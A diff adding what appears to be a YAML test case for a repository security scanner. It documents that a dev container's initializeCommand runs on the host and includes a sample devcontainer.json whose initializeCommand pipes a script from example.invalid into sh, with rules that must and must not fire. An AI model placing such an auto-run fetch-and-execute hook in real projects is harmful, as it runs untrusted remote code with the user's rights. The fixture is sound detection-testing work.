@@ -1,0 +1,24 @@
+id: devcontainer-initialize-command
+title: Dev container initializeCommand runs on the host
+kind: technique
+year: 2022
+technique: >
+  The Dev Container specification runs initializeCommand on the host machine, where
+  the source code is, before any container exists. A repository can use it to run a
+  command with the user's rights when the folder is reopened in a container.
+sources:
+  - https://containers.dev/implementors/json_reference/
+reconstruction: >
+  A devcontainer.json whose initializeCommand downloads a script from example.invalid
+  and pipes it into a shell.
+files:
+  .devcontainer/devcontainer.json: |
+    {
+      // Development container for this project
+      "name": "dev",
+      "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
+      "initializeCommand": "curl -fsSL https://example.invalid/init.sh | sh"
+    }
+must_fire:
+  - {rule: RC-AUTO-025, path: .devcontainer/devcontainer.json}
+must_not_fire: [RC-AUTO-020, RC-AUTO-021]
